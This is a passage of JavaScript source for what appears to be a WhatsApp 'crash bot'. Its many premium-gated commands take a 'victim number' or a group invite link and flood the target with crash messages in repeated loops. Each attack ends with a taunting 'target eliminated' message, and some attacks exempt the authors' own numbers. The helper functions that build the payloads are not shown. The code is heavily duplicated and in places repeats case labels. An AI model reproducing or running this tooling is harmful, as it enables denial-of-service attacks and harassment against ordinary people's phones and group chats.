    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "jids-engine": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣", 
    [whatsappNumber]
  );
}
break;
case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
deltaxcrash.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break
case "Narutodestruct": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break
case "Rasengan": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348102487241") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "rasengan1": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348102487241") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions( 
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "naruto-novo": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348102487241") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "naruto-crash1": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2348102487241") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await deltaxcrash.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONE BUG HAS BEEN SENT TO THE GROUP!.*");
      deltaxcrash.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "reset-ui": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285766950461") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await deltaxcrash.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'satanic999': case '🌹': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'bug-vip': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await bakdok(target, force)
await ngeloc(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
//=================================================//
case '🗿': case 'naruto-virus': case 'crash-total': case '🔥': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
//=================================================//
case 'chace-bug': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break
case 'gfsCdgsGsGs': {

if (!isPremium) return reply('_</> owner only..._')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.`)
}
break

case "gfsCdgsGsGs": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "blank": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
    "𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒅𝒐𝒘𝒏 𝒖𝒔𝒊𝒏𝒈*" + command + "* \n\n 𝒏𝒐 𝒎𝒆𝒓𝒄𝒚 𝒇𝒐𝒓 𝒚𝒐𝒖 𝒃𝒓𝒖𝒉 💣.", 
    [whatsappNumber]
  );
}
break;
case "spesial-bug": {

if (!isPremium) return reply('_</> owner only..._')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "201025663589") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "𝒕𝒂𝒓𝒈𝒆𝒕 @" + whatsappNumber.split('@')[0] + 
